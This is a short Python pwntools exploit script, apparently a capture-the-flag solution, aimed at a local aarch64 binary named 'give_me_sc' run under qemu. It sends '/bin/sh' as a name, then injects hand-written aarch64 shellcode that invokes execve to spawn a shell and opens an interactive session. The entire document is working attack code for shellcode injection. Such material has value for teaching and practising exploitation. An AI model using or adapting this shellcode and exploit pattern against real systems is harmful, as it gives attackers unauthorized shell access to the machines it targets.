#!/usr/bin/env python3
from pwn import *

context.arch = 'aarch64'

sc = asm('''
; # execve
    mov x8, 221
    mov x1, 0
    mov x2, 0
    svc 0
; # never return
; # exit
    mov x8, 93
    svc 0
''')

p = process('qemu-aarch64-static ./give_me_sc'.split())

p.recvuntil(b'What\'s your name:\n')

p.send(b'/bin/sh\0')

p.recvuntil(b'Give me shellcode:\n')

p.send(sc)

p.interactive()